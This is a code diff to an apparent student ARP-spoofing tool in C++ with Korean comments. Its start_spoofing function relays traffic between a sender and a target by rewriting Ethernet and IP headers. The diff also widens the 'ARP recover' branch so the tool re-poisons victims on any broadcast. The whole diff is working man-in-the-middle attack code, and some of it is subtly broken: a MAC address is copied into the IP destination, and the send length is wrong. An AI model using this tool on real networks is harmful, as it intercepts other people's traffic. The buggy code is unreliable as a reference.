@@ -26,11 +26,19 @@ void usage() {
         printf("sample: send-arp-test wlan0\n");
 }
 
+void print_info(struct libnet_ipv4_hdr *header, u_int8_t *m , u_int8_t *m2){
+        printf("MAC : %02x:%02x:%02x:%02x:%02x:%02x ->",m[0],m[1],m[2],m[3],m[4],m[5]);
+
+        printf("%02x:%02x:%02x:%02x:%02x:%02x\n",m2[0],m2[1],m2[2],m2[3],m2[4],m2[5]);
+
+        printf("IP : %s -> ",inet_ntoa(header->ip_src));
+	printf("%s\n",inet_ntoa(header->ip_dst));
+}
 int start_spoofing(char*dev ,char* sip , char* tip){
 
         Mac macAddress = getMacAddress(dev);
         char errbuf[PCAP_ERRBUF_SIZE];
-        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
 	if (handle == nullptr) {
                 fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                 return -1;
@@ -66,12 +74,35 @@ int start_spoofing(char*dev ,char* sip , char* tip){
                 Packet_eth = (struct libnet_ethernet_hdr *)(received_pkt);
                 Packet_ip = (struct libnet_ipv4_hdr *)(received_pkt + sizeof(struct libnet_ethernet_hdr));
 
+
+		//printf("\nPacket Capture!\n");
+		//print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth -> ether_dhost);
+
 		//Sender -> Attacker -> Target
                 if(ntohs(Packet_eth-> ether_type)==(EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==SenderMac){
+			
+			printf("\n");
+			printf("Before\n");	
+			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);
+
+
 			u_int8_t* tmpMac =static_cast<uint8_t*>(macAddress);
 			u_int8_t* tmpTmac = static_cast<uint8_t*>(TargetMac);
 			memcpy(Packet_eth->ether_shost, tmpMac, MAC_ADDR_LEN);
-			memcpy(Packet_eth -> ether_dhost, tmpTmac,MAC_ADDR_LEN);	
+			memcpy(Packet_eth -> ether_dhost, tmpTmac,MAC_ADDR_LEN);
+			
+
+			// Attacker IP를 네트워크 바이트 순서로 변환하여 패킷에 할당
+			uint32_t attackerIpNetworkOrder = htonl(static_cast<uint32_t>(AttackerIp));
+			memcpy(&Packet_ip->ip_src.s_addr, &attackerIpNetworkOrder, sizeof(uint32_t));
+
+			// Tip IP를 네트워크 바이트 순서로 변환하여 패킷에 할당
+			uint32_t tipIpNetworkOrder = htonl(static_cast<uint32_t>(Ip(tip)));
+			//memcpy(&Packet_ip->ip_dst.s_addr, &tipIpNetworkOrder, sizeof(uint32_t));
+
+			printf("\nAfter\n");
+			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);
+	
 
                         res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
                         if (res != 0) {
@@ -83,16 +114,27 @@ int start_spoofing(char*dev ,char* sip , char* tip){
                 }
                 //Target -> Attaceker -> Sender
                 else if(ntohs(Packet_eth -> ether_type) == (EthHdr::Ip4) && Mac(Packet_eth->ether_shost)==TargetMac){
+
+
+			printf("\nBefore\n");
+			print_info(Packet_ip,Packet_eth->ether_shost,Packet_eth->ether_dhost);
 			u_int8_t* tmpMac = static_cast<uint8_t*>(macAddress);
 			u_int8_t* tmpSenderMac = static_cast<uint8_t*>(SenderMac);
 
-			memcpy(Packet_eth -> ether_shost,tmpMac,MAC_ADDR_LEN);
-			memcpy(Packet_eth -> ether_dhost,tmpSenderMac,MAC_ADDR_LEN);
+			uint32_t tmpAip = htonl(static_cast<uint32_t>(AttackerIp));
+			uint32_t tmpSip = htonl(static_cast<uint32_t>(Ip(sip)));
 
-			Packet_ip->ip_src.s_addr = htonl(static_cast<uint32_t>(AttackerIp));
-                        Packet_ip->ip_dst.s_addr = htonl(static_cast<uint32_t>(Ip(tip)));
 
+			memcpy(&Packet_eth -> ether_shost,tmpMac,MAC_ADDR_LEN);
+			memcpy(&Packet_eth -> ether_dhost,tmpSenderMac,MAC_ADDR_LEN);
+
+			memcpy(&Packet_ip->ip_src.s_addr,&tmpAip,sizeof(uint32_t));
+			memcpy(&Packet_ip->ip_dst.s_addr,&tmpSenderMac,sizeof(uint32_t));
                         res = pcap_sendpacket(handle, received_pkt, sizeof(pcap_pkthdr));
+
+
+			printf("\nAfter\n");
+			print_info(Packet_ip,Packet_eth -> ether_shost,Packet_eth->ether_dhost);
                         if (res != 0) {
                                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                         }else{
@@ -103,7 +145,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 
                 //When ARP Table Recover
                 else if(Mac(Packet_eth -> ether_dhost)==Mac::broadcastMac()){
-                        if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
+                        //if(Mac(Packet_eth -> ether_shost)==TargetMac || Mac(Packet_eth -> ether_shost) == SenderMac){
                                 //Sender감염 패킷생성
                                 EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
                                 //패킷 전송
@@ -114,7 +156,7 @@ int start_spoofing(char*dev ,char* sip , char* tip){
 				{
                                         printf("\n+Detecting Arp Recover and re-Infection+\n");
                                 }
-                        }
+                       // }
                 }
                 else{
                         EthArpPacket packet = Sender_Infection(dev,macAddress,SenderMac,Ip(sip),Ip(tip));
